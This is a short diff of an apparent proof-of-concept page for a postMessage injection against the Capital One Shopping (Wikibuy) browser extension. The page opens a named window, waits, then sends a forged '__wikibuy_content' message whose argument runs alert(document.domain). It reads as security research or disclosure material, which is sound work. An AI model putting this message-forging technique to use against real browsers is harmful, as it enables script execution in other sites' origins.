@@ -11,7 +11,7 @@
   <script>
 
     async function start() {
-      win = window.open("https://capitaloneshopping.com", "capital");
+      win = window.open("", "capital");
       await new Promise((resolve) => setTimeout(resolve, 20000));
 
       win.postMessage({'data': {'invoke': 'toggleMatchSurvey', 'id': 'random-id', 'args': [location.href = alert(document.domain)]}, 'src': '__wikibuy_content'}, "*")
